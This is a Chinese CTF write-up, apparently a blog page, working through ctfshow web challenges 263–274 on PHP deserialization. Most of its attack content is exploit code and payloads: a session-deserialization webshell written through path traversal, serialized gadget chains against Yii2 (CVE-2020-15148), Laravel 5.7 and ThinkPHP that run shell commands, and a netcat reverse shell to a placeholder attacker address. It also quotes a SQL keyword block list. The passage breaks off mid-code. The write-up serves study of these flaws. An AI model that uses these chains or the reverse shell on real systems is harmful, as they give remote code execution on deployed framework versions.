+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/107750063?ops_request_misc=%7B%22request_id%22:%22160775411819724848183660%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=160775411819724848183660&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-107750063.pc_v2_rank_blog_default&utm_term=session&spm=1018.2118.3001.4450">https://blog.csdn.net/solitudi/article/details/107750063?ops_request_misc&#x3D;%7B%22request%5Fid%22%3A%22160775411819724848183660%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id&#x3D;160775411819724848183660&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>blog</del>first_rank_v2~rank_v29-2-107750063.pc_v2_rank_blog_default&amp;utm_term&#x3D;session&amp;spm&#x3D;1018.2118.3001.4450</a> session<br><a target="_blank" rel="noopener" href="https://www.jb51.net/article/116246.htm">https://www.jb51.net/article/116246.htm</a> session</p>
+</blockquote>
+<h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p><a target="_blank" rel="noopener" href="http://www.zip文件泄露/">www.zip文件泄露</a></p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+error_reporting(0);
+ini_set(&#39;display_errors&#39;, 0);
+ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
+date_default_timezone_set(&quot;Asia&#x2F;Shanghai&quot;);
+session_start();
+use \CTFSHOW\CTFSHOW; 
+require_once &#39;CTFSHOW.php&#39;;
+$db &#x3D; new CTFSHOW([
+    &#39;database_type&#39; &#x3D;&gt; &#39;mysql&#39;,
+    &#39;database_name&#39; &#x3D;&gt; &#39;web&#39;,
+    &#39;server&#39; &#x3D;&gt; &#39;localhost&#39;,
+    &#39;username&#39; &#x3D;&gt; &#39;root&#39;,
+    &#39;password&#39; &#x3D;&gt; &#39;root&#39;,
+    &#39;charset&#39; &#x3D;&gt; &#39;utf8&#39;,
+    &#39;port&#39; &#x3D;&gt; 3306,
+    &#39;prefix&#39; &#x3D;&gt; &#39;&#39;,
+    &#39;option&#39; &#x3D;&gt; [
+        PDO::ATTR_CASE &#x3D;&gt; PDO::CASE_NATURAL
+    ]
+]);
+
+&#x2F;&#x2F; sql注入检查
+function checkForm($str)&#123;
+    if(!isset($str))&#123;
+        return true;
+    &#125;else&#123;
+    return preg_match(&quot;&#x2F;select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\&#96;|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\&#x3D;|\[|\]|\;|\:|\&#39;|\&quot;|\&lt;|\,|\&gt;|\?&#x2F;i&quot;,$str);
+    &#125;
+&#125;
+
+
+class User&#123;
+    public $username;
+    public $password;
+    public $status;
+    function __construct($username,$password)&#123;
+        $this-&gt;username &#x3D; $username;
+        $this-&gt;password &#x3D; $password;
+    &#125;
+    function setStatus($s)&#123;
+        $this-&gt;status&#x3D;$s;
+    &#125;
+    function __destruct()&#123;
+        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#39;Y-m-d H:i:s&#39;));
+    &#125;
+&#125;
+
+&#x2F;*生成唯一标志
+*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)
+*&#x2F;
+
+function  uuid()  
+&#123;  
+    $chars &#x3D; md5(uniqid(mt_rand(), true));  
+    $uuid &#x3D; substr ( $chars, 0, 8 ) . &#39;-&#39;
+            . substr ( $chars, 8, 4 ) . &#39;-&#39; 
+            . substr ( $chars, 12, 4 ) . &#39;-&#39;
+            . substr ( $chars, 16, 4 ) . &#39;-&#39;
+            . substr ( $chars, 20, 12 );  
+    return $uuid ;  
+&#125;  </code></pre>
+<p>inc.php中有file_put_contents函数</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+	error_reporting(0);
+	session_start();
+	&#x2F;&#x2F;超过5次禁止登陆
+	if(isset($_SESSION[&#39;limit&#39;]))&#123;
+		$_SESSION[&#39;limti&#39;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#39;limit&#39;]&#x3D;base64_decode($_COOKIE[&#39;limit&#39;]);
+		$_COOKIE[&#39;limit&#39;] &#x3D; base64_encode(base64_decode($_COOKIE[&#39;limit&#39;]) +1);
+	&#125;else&#123;
+		 setcookie(&quot;limit&quot;,base64_encode(&#39;1&#39;));&#x2F;&#x2F; 
+		 $_SESSION[&#39;limit&#39;]&#x3D; 1;
+	&#125;
+?&gt;
+</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+
+error_reporting(0);
+require_once &#39;inc&#x2F;inc.php&#39;;
+$GET &#x3D; array(&quot;u&quot;&#x3D;&gt;$_GET[&#39;u&#39;],&quot;pass&quot;&#x3D;&gt;$_GET[&#39;pass&#39;]);
+
+if($GET)&#123;
+
+	$data&#x3D; $db-&gt;get(&#39;admin&#39;,
+	[	&#39;id&#39;,
+		&#39;UserName0&#39;
+	],[
+		&quot;AND&quot;&#x3D;&gt;[
+		&quot;UserName0[&#x3D;]&quot;&#x3D;&gt;$GET[&#39;u&#39;],
+		&quot;PassWord1[&#x3D;]&quot;&#x3D;&gt;$GET[&#39;pass&#39;] &#x2F;&#x2F;密码必须为128位大小写字母+数字+特殊符号，防止爆破
+		]
+	]);
+	if($data[&#39;id&#39;])&#123;
+		&#x2F;&#x2F;登陆成功取消次数累计
+		$_SESSION[&#39;limit&#39;]&#x3D; 0;
+		echo json_encode(array(&quot;success&quot;,&quot;msg&quot;&#x3D;&gt;&quot;欢迎您&quot;.$data[&#39;UserName0&#39;]));
+	&#125;else&#123;
+		&#x2F;&#x2F;登陆失败累计次数加1
+		$_COOKIE[&#39;limit&#39;] &#x3D; base64_encode(base64_decode($_COOKIE[&#39;limit&#39;])+1);
+		echo json_encode(array(&quot;error&quot;,&quot;msg&quot;&#x3D;&gt;&quot;登陆失败&quot;));
+	&#125;
+&#125;
+</code></pre>
+<p>index.php就是登录页面、check.php进行次数检测。whatweb检测一下php版本是7.3.11<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690621414307-0b75bbfc-20e6-46df-9214-207db020284a.png" alt="image.png"><br>session.serialize_handler( 5.5.4前默认是php；5.5.4后改为php_serialize)存在以下几种：</p>
+<ul>
+<li>php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</li>
+<li>php 键名+竖线（|）+经过serialize()函数处理过的值</li>
+<li>php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</li>
+</ul>
+<p>php处理器而不是php_serialize处理器，所以存在session反序列漏洞.<br>在 php_serialize 引擎下，session文件中存储的数据为:</p>
+<pre class="language-php" data-language="php"><code class="language-php">a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;&#125;</code></pre>
+<p>php 引擎下文件内容为:</p>
+<pre class="language-php" data-language="php"><code class="language-php">name|s:6:&quot;spoock&quot;;</code></pre>
+<p>exp：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+class User&#123;
+    public $username&#x3D;&quot;admin&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&quot;;
+    public $password&#x3D;&quot;&lt;?php system(&#39;cat flag.php&#39;);?&gt;&quot;;
+    public $status;
+
+&#125;
+$a &#x3D; new User();
+$c &#x3D;  &quot;|&quot;.serialize($a);
+echo urlencode(base64_encode($c));</code></pre>
+<p>这里说一下操作步骤。</p>
+<ol>
+<li>先访问页面，获取到cookie和session。</li>
+<li>运行exp，将反序列化字符放入cookie中limit</li>
+<li>访问check.php</li>
+<li>访问1.php</li>
+</ol>
+<h1 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_COOKIE[&#39;msg&#39;]))&#123;
+    $msg &#x3D; unserialize(base64_decode($_SESSION[&#39;msg&#39;]));
+    if($msg-&gt;token&#x3D;&#x3D;&#39;admin&#39;)&#123;
+        echo $flag;
+    &#125;
+&#125;</code></pre>
+<p>和上一个逃逸差别是在访问message.php时需要在cookie中添加msg的参数作为session，值并没有要求。</p>
+<pre class="language-php" data-language="php"><code class="language-php">?f&#x3D;1&amp;m&#x3D;2&amp;t&#x3D;3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre>
+<p>然后再message.php传入一个cookie值为msg&#x3D;1<br>以上是wp中所说的步骤，但是这里我无论如何执行都是<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690625827239-a0c8c2ad-a4e6-4578-a9d1-21a26204f743.png" alt="image.png"><br>即使重新写payload也是相同结果。<br>最后修改好了，是因为我开了两个页面，第一个页面传出的session我没有交给第二个页面<code>message.php</code>导致不能得到回显，使用一个页面修改就好了。</p>
+<h1 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h1><h3 id="反序列化指针引用"><a href="#反序列化指针引用" class="headerlink" title="反序列化指针引用&amp;"></a>反序列化指针引用&amp;</h3><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+include(&#39;flag.php&#39;);
+highlight_file(__FILE__);
+class ctfshowAdmin&#123;
+    public $token;
+    public $password;
+
+    public function __construct($t,$p)&#123;
+        $this-&gt;token&#x3D;$t;
+        $this-&gt;password &#x3D; $p;
+    &#125;
+    public function login()&#123;
+        return $this-&gt;token&#x3D;&#x3D;&#x3D;$this-&gt;password;
+    &#125;
+&#125;
+
+$ctfshow &#x3D; unserialize($_GET[&#39;ctfshow&#39;]);
+$ctfshow-&gt;token&#x3D;md5(mt_rand());&#x2F;&#x2F;生成随机数
+
+if($ctfshow-&gt;login())&#123;
+    echo $flag;
+&#125;</code></pre>
+<h2 id="引用传值"><a href="#引用传值" class="headerlink" title="引用传值"></a>引用传值</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+class abc&#123;
+    public $a &#x3D; &#39;1&#39;;
+    public $b &#x3D; &#39;2&#39;;
+&#125;
+$c &#x3D; new abc();
+$c-&gt;a &#x3D;&amp;$c-&gt;b;
+$c-&gt;a &#x3D; &#39;1&#39;;&#x2F;&#x2F;此时哪怕修改a的值也不管用
+$c-&gt;b &#x3D; md5(mt_rand());
+print_r($c-&gt;a);
+?&gt;
+
+&#x2F;&#x2F;运行结果
+cc459dba9ce1830f72c80ba14532bbac</code></pre>
+<p>exp：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+class ctfshowAdmin&#123;
+    public $token&#x3D;1;
+    public $password&#x3D;1;
+&#125;
+$a &#x3D; new ctfshowAdmin();
+$a-&gt;password&#x3D;&amp;$a-&gt;token;&#x2F;&#x2F;让passwd的值随token变
+echo serialize($a);
+
+&#x2F;&#x2F;运行结果
+O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;i:1;s:8:&quot;password&quot;;R:2;&#125;</code></pre>
+<h1 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h1><h3 id="php对类名大小写不敏感"><a href="#php对类名大小写不敏感" class="headerlink" title="php对类名大小写不敏感"></a>php对类名大小写不敏感</h3><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
+
+include(&#39;flag.php&#39;);
+$cs &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);
+
+
+class ctfshow&#123;
+    public $username&#x3D;&#39;xxxxxx&#39;;
+    public $password&#x3D;&#39;xxxxxx&#39;;
+    public function __construct($u,$p)&#123;
+        $this-&gt;username&#x3D;$u;
+        $this-&gt;password&#x3D;$p;
+    &#125;
+    public function login()&#123;
+        return $this-&gt;username&#x3D;&#x3D;&#x3D;$this-&gt;password;
+    &#125;
+    public function __toString()&#123;
+        return $this-&gt;username;
+    &#125;
+    public function __destruct()&#123;
+        global $flag;
+        echo $flag;
+    &#125;
+&#125;
+$ctfshowo&#x3D;@unserialize($cs);
+if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $cs))&#123;
+    throw new Exception(&quot;Error $ctfshowo&quot;,1);
+&#125;</code></pre>
+<p>出现ctfshow就会抛出异常，就不能触发__destruct方法，因此使用大写就行。</p>
+<ul>
+<li>区分大小写的： 变量名、常量名、数组索引（键名key）</li>
+<li>不区分大小写的：函数名、方法名、类名、魔术常量、NULL、FALSE、TRUE</li>
+</ul>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+class Ctfshow&#123;&#125;;
+$a &#x3D; new Ctfshow();
+echo serialize($a);
+?&gt;
+
+&#x2F;&#x2F;O:7:&quot;Ctfshow&quot;:0:&#123;&#125;</code></pre>
+<p>这里的的使用方法挺神奇：<br>在hackbar不知道为什么传不进去post请求体，用bp抓包就行了：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690624961632-8d70a56c-bd65-4a35-87d1-0bb968ead848.png" alt="image.png"></p>
+<h1 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h1><h3 id="CVE-2020-15148-Yii2反序列化漏洞"><a href="#CVE-2020-15148-Yii2反序列化漏洞" class="headerlink" title="CVE-2020-15148 Yii2反序列化漏洞"></a>CVE-2020-15148 Yii2反序列化漏洞</h3><p>后面一堆操作有点没看懂。一查发现是一个漏洞：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943">https://blog.csdn.net/xuandao_ahfengren&#x2F;article&#x2F;details&#x2F;111259943</a></p>
+</blockquote>
+<p>admin admin弱口令密码登录，在about页面查看源代码会发现：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;!--?view-source --&gt;</code></pre>
+<p>但是这里我一点击about就会退出admin状态。可能是某个地方出了问题，不重要。<br>访问：<code>/index.php?r=site%2Fabout&amp;view-source</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690626931485-6d460a9f-e967-42e5-9521-993e2781c164.png" alt="image.png"><br>提示：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;&#x2F;backdoor&#x2F;shell
+unserialize(base64_decode($_GET[&#39;code&#39;]))
+</code></pre>
+<p>直接用网上的poc：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+
+namespace yii\rest&#123;
+    class IndexAction&#123;
+        public $checkAccess;
+        public $id;
+        public function __construct()&#123;
+            $this-&gt;checkAccess &#x3D; &#39;exec&#39;;	&#x2F;&#x2F;PHP函数
+            $this-&gt;id &#x3D; &#39;cat &#x2F;flag &gt;2.txt&#39;;    &#x2F;&#x2F;PHP函数的参数  
+        &#125;
+    &#125;
+&#125;
+namespace Faker &#123;
+
+    use yii\rest\IndexAction;
+
+    class Generator
+    &#123;
+        protected $formatters;
+
+        public function __construct()
+        &#123;
+            $this-&gt;formatters[&#39;close&#39;] &#x3D; [new IndexAction(), &#39;run&#39;];
+        &#125;
+    &#125;
+&#125;
+namespace yii\db&#123;
+
+    use Faker\Generator;
+
+    class BatchQueryResult&#123;
+        private $_dataReader;
+        public function __construct()
+        &#123;
+            $this-&gt;_dataReader&#x3D;new Generator();
+        &#125;
+    &#125;
+&#125;
+namespace&#123;
+
+    use yii\db\BatchQueryResult;
+
+    echo base64_encode(serialize(new BatchQueryResult()));
+&#125;
+</code></pre>
+<p>payload：</p>
+<pre class="language-php" data-language="php"><code class="language-php">?r&#x3D;backdoor&#x2F;shell&amp;code&#x3D;TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo0OiJleGVjIjtzOjI6ImlkIjtzOjE2OiJjYXQgL2ZsYWcgPjIudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19</code></pre>
+<p>然后访问根目录下的2.txt即可</p>
+<h1 id="web268-269"><a href="#web268-269" class="headerlink" title="web268-269"></a>web268-269</h1><h3 id="CVE-2020-15148-Yii2反序列化漏洞-1"><a href="#CVE-2020-15148-Yii2反序列化漏洞-1" class="headerlink" title="CVE-2020-15148 Yii2反序列化漏洞"></a>CVE-2020-15148 Yii2反序列化漏洞</h3><p>类似但是需要改改poc，因为有过滤：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+namespace yii\rest &#123;
+    class Action
+    &#123;
+        public $checkAccess;
+    &#125;
+    class IndexAction
+    &#123;
+        public function __construct($func, $param)
+        &#123;
+            $this-&gt;checkAccess &#x3D; $func;
+            $this-&gt;id &#x3D; $param;
+        &#125;
+    &#125;
+&#125;
+namespace yii\web &#123;
+    abstract class MultiFieldSession
+    &#123;
+        public $writeCallback;
+    &#125;
+    class DbSession extends MultiFieldSession
+    &#123;
+        public function __construct($func, $param)
+        &#123;
+            $this-&gt;writeCallback &#x3D; [new \yii\rest\IndexAction($func, $param), &quot;run&quot;];
+        &#125;
+    &#125;
+&#125;
+namespace yii\db &#123;
+    use yii\base\BaseObject;
+    class BatchQueryResult
+    &#123;
+        private $_dataReader;
+        public function __construct($func, $param)
+        &#123;
+            $this-&gt;_dataReader &#x3D; new \yii\web\DbSession($func, $param);
+        &#125;
+    &#125;
+&#125;
+namespace &#123;
+    $exp &#x3D; new \yii\db\BatchQueryResult(&#39;shell_exec&#39;, &#39;cp &#x2F;f* 1.txt&#39;); &#x2F;&#x2F;此处写命令
+    echo(base64_encode(serialize($exp)));
+&#125;
+</code></pre>
+<p>payload：</p>
+<pre class="language-php" data-language="php"><code class="language-php">?r&#x3D;backdoor&#x2F;shell&amp;code&#x3D;TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0&#x3D;</code></pre>
+<h1 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h1><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+namespace yii\rest &#123;
+    class Action
+    &#123;
+        public $checkAccess;
+    &#125;
+    class IndexAction
+    &#123;
+        public function __construct($func, $param)
+        &#123;
+            $this-&gt;checkAccess &#x3D; $func;
+            $this-&gt;id &#x3D; $param;
+        &#125;
+    &#125;
+&#125;
+namespace yii\web &#123;
+    abstract class MultiFieldSession
+    &#123;
+        public $writeCallback;
+    &#125;
+    class DbSession extends MultiFieldSession
+    &#123;
+        public function __construct($func, $param)
+        &#123;
+            $this-&gt;writeCallback &#x3D; [new \yii\rest\IndexAction($func, $param), &quot;run&quot;];
+        &#125;
+    &#125;
+&#125;
+namespace yii\db &#123;
+    use yii\base\BaseObject;
+    class BatchQueryResult
+    &#123;
+        private $_dataReader;
+        public function __construct($func, $param)
+        &#123;
+            $this-&gt;_dataReader &#x3D; new \yii\web\DbSession($func, $param);
+        &#125;
+    &#125;
+&#125;
+namespace &#123;
+    $exp &#x3D; new \yii\db\BatchQueryResult(&#39;shell_exec&#39;, &#39;nc xxx.xxx.xxx.xxx 4567 -e &#x2F;bin&#x2F;sh&#39;);
+    echo(base64_encode(serialize($exp)));
+&#125;
+</code></pre>
+<p>反弹一下即可，攻击机：</p>
+<pre class="language-php" data-language="php"><code class="language-php">nc -lvvp 端口号</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690628634956-c431daf0-409d-44ba-b40f-75d327b056de.png" alt="image.png"></p>
+<h1 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/laravel/laravel/tree/5.7">https://github.com/laravel/laravel/tree/5.7</a> laravel5.7</p>
+</blockquote>
+<h3 id="laravel5-7反序列化漏洞"><a href="#laravel5-7反序列化漏洞" class="headerlink" title="laravel5.7反序列化漏洞"></a>laravel5.7反序列化漏洞</h3><p>poc：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+
+namespace Illuminate\Foundation\Testing &#123;
+    class PendingCommand
+    &#123;
+        public $test;
+        protected $app;
+        protected $command;
+        protected $parameters;
+
+        public function __construct($test, $app, $command, $parameters)
+        &#123;
+            $this-&gt;test &#x3D; $test;                 &#x2F;&#x2F;一个实例化的类 Illuminate\Auth\GenericUser
+            $this-&gt;app &#x3D; $app;                   &#x2F;&#x2F;一个实例化的类 Illuminate\Foundation\Application
+            $this-&gt;command &#x3D; $command;           &#x2F;&#x2F;要执行的php函数 system
+            $this-&gt;parameters &#x3D; $parameters;     &#x2F;&#x2F;要执行的php函数的参数  array(&#39;id&#39;)
+        &#125;
+    &#125;
+&#125;
+
+namespace Faker &#123;
+    class DefaultGenerator
+    &#123;
+        protected $default;
+
+        public function __construct($default &#x3D; null)
+        &#123;
+            $this-&gt;default &#x3D; $default;
+        &#125;
+    &#125;
+&#125;
+
+namespace Illuminate\Foundation &#123;
+    class Application
+    &#123;
+        protected $instances &#x3D; [];
+
+        public function __construct($instances &#x3D; [])
+        &#123;
+            $this-&gt;instances[&#39;Illuminate\Contracts\Console\Kernel&#39;] &#x3D; $instances;
+        &#125;
+    &#125;
+&#125;
+
+namespace &#123;
+    $defaultgenerator &#x3D; new Faker\DefaultGenerator(array(&quot;hello&quot; &#x3D;&gt; &quot;world&quot;));
+
+    $app &#x3D; new Illuminate\Foundation\Application();
+
+    $application &#x3D; new Illuminate\Foundation\Application($app);
+
+    $pendingcommand &#x3D; new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, &#39;system&#39;, array(&#39;cat &#x2F;flag&#39;));
+
+    echo urlencode(serialize($pendingcommand));
+&#125;
+</code></pre>
+<p>post data中传入参数即可</p>
+<h1 id="web272、web273"><a href="#web272、web273" class="headerlink" title="web272、web273"></a>web272、web273</h1><p>poc：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+&#x2F;*
+Author:monitor
+description:
+    laravel deserialization chain
+*&#x2F;
+namespace Illuminate\Broadcasting
+&#123;
+    class PendingBroadcast&#123;
+        protected $events;
+        protected $event;
+        public function __construct($events,$event)
+        &#123;
+            $this-&gt;events &#x3D; $events;
+            $this-&gt;event &#x3D; $event;
+        &#125;
+    &#125;
+&#125;
+
+namespace Illuminate\Bus
+&#123;
+    class Dispatcher&#123;
+        protected $queueResolver;
+        public function __construct($queueResolver)
+        &#123;
+            $this-&gt;queueResolver &#x3D; $queueResolver;
+        &#125;
+    &#125;
+&#125;
+
+namespace Mockery\Loader
+&#123;
+    class EvalLoader&#123;
+
+    &#125;
+&#125;
+
+namespace Mockery\Generator
+&#123;
+    class MockDefinition&#123;
+        protected $config;
+        protected $code;
+        public function __construct($config,$code)&#123;
+            $this-&gt;config &#x3D; $config;
+            $this-&gt;code &#x3D; $code;
+        &#125;
+    &#125;
+    class MockConfiguration&#123;
+        protected $name;
+        public function __construct($name)
+        &#123;
+            $this-&gt;name &#x3D; $name;
+        &#125;
+    &#125;
+&#125;
+
+namespace Illuminate\Queue
+&#123;
+    class CallQueuedClosure&#123;
+        public $connection;
+        public function __construct($connection)
+        &#123;
+            $this-&gt;connection &#x3D; $connection;
+        &#125;
+    &#125;
+&#125;
+
+namespace
+&#123;   
+    if($argc&lt;2)&#123;
+        echo &quot;Description:\n\tUse laravel deserialization to eval php code,don&#39;t need to input php tags.&quot;;
+        echo &quot;\nUsage:&quot; .$argv[0] . &quot; &lt;code&gt;&quot;;
+        exit();
+    &#125;
+    $code &#x3D; $argv[1];
+    $mockconfiguration &#x3D; new Mockery\Generator\MockConfiguration(&quot;pass&quot;);
+    $mockdefination &#x3D; new Mockery\Generator\MockDefinition($mockconfiguration,&quot;&lt;?php &quot;.$code.&quot; exit;?&gt;&quot;);
+    $callqueuedclosure &#x3D; new Illuminate\Queue\CallQueuedClosure($mockdefination);
+    $evaload &#x3D; new Mockery\Loader\EvalLoader();
+    $dispatcher &#x3D; new Illuminate\Bus\Dispatcher(array($evaload,&quot;load&quot;));
+    $pendingbroadcast &#x3D; new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$callqueuedclosure);
+    echo urlencode(serialize($pendingbroadcast));
+&#125;
+</code></pre>
+<p>或者：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+namespace Illuminate\Broadcasting&#123;
+
+    use Illuminate\Bus\Dispatcher;
+    use Illuminate\Foundation\Console\QueuedCommand;
+
+    class PendingBroadcast
+    &#123;
+        protected $events;
+        protected $event;
+        public function __construct()&#123;
+            $this-&gt;events&#x3D;new Dispatcher();
+            $this-&gt;event&#x3D;new QueuedCommand();
+        &#125;
+    &#125;
+&#125;
+namespace Illuminate\Foundation\Console&#123;
+
+    use Mockery\Generator\MockDefinition;
+
+    class QueuedCommand
+    &#123;
+        public $connection;
+        public function __construct()&#123;
+            $this-&gt;connection&#x3D;new MockDefinition();
+        &#125;
+    &#125;
+&#125;
+namespace Illuminate\Bus&#123;
+
+    use Mockery\Loader\EvalLoader;
+
+    class Dispatcher
+    &#123;
+        protected $queueResolver;
+        public function __construct()&#123;
+            $this-&gt;queueResolver&#x3D;[new EvalLoader(),&#39;load&#39;];
+        &#125;
+    &#125;
+&#125;
+namespace Mockery\Loader&#123;
+    class EvalLoader
+    &#123;
+
+    &#125;
+&#125;
+namespace Mockery\Generator&#123;
+    class MockDefinition
+    &#123;
+        protected $config;
+        protected $code;
+        public function __construct()
+        &#123;
+            $this-&gt;code&#x3D;&quot;&lt;?php system(&#39;cat &#x2F;f*&#39;);exit()?&gt;&quot;; &#x2F;&#x2F;此处是PHP代码
+            $this-&gt;config&#x3D;new MockConfiguration();
+        &#125;
+    &#125;
+    class MockConfiguration
+    &#123;
+        protected $name&#x3D;&quot;feng&quot;;
+    &#125;
+&#125;
+
+namespace&#123;
+
+    use Illuminate\Broadcasting\PendingBroadcast;
+
+    echo urlencode(serialize(new PendingBroadcast()));
+&#125;
+</code></pre>
+<p>payload:</p>
+<pre class="language-php" data-language="php"><code class="language-php">data&#x3D;O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A35%3A%22Mockery%5CGenerator%5CMockConfiguration%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A4%3A%22feng%22%3B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A32%3A%22%3C%3Fphp+system%28%27cat+%2Ff%2A%27%29%3Bexit%28%29%3F%3E%22%3B%7D%7D%7D</code></pre>
+<h1 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6619#toc-1">https://xz.aliyun.com/t/6619#toc-1</a></p>
+</blockquote>
+<h3 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h3><p>老顾客</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+namespace think;
+abstract class Model&#123;
+    protected $append &#x3D; [];
+    private $data &#x3D; [];
+    function __construct()&#123;
+        $this-&gt;append &#x3D; [&quot;lin&quot;&#x3D;&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]];
+        $this-&gt;data &#x3D; [&quot;lin&quot;&#x3D;&gt;new Request()];
+    &#125;
+&#125;
+class Request
+&#123;
+    protected $hook &#x3D; [];
+    protected $filter &#x3D; &quot;system&quot;; &#x2F;&#x2F;PHP函数
+    protected $config &#x3D; [
+        &#x2F;&#x2F; 表单ajax伪装变量
+        &#39;var_ajax&#39;         &#x3D;&gt; &#39;_ajax&#39;,  
+    ];
